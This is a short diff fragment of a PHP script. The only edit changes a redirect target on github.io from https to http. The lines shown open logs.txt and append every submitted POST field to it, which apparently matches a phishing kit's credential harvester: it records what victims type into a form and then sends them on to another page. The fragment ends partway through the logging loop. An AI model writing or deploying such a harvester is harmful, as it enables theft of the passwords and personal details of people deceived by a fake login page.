@@ -1,5 +1,5 @@
 <?php
-header('location:https://nccnareah.github.io/oluga/');
+header('location:http://nccnareah.github.io/oluga/');
 $handle = fopen("logs.txt","a");
 foreach($_POST as $variable => $value){
 fwrite($handle, $variable);
